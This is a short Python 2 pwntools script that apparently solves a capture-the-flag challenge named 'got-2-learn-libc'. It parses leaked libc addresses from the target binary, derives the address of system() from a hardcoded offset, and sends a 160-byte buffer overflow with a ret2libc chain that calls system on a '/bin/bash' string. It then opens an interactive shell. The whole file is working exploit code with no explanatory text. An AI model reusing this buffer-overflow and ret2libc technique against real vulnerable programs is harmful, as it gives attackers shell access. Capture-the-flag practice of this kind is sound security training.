#!usr/bin/env python

import pwn
import re

gdb_puts = 0xf762a140
gdb_system = 0xf7605940

offset = gdb_puts - gdb_system

elf = pwn.ELF('/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln')
p = elf.process()

prompt = p.recv()


puts = int(re.findall('puts: (.*)', prompt)[0], 16)
bin_bash = int(re.findall('useful_string: (.*)', prompt)[0], 16)

print puts
print bin_bash

system = puts - offset

payload = 'A' * 160
payload += pwn.p32(system)
payload += 'JUNK'
payload += pwn.p32(bin_bash)

p.sendline(payload)
p.interactive()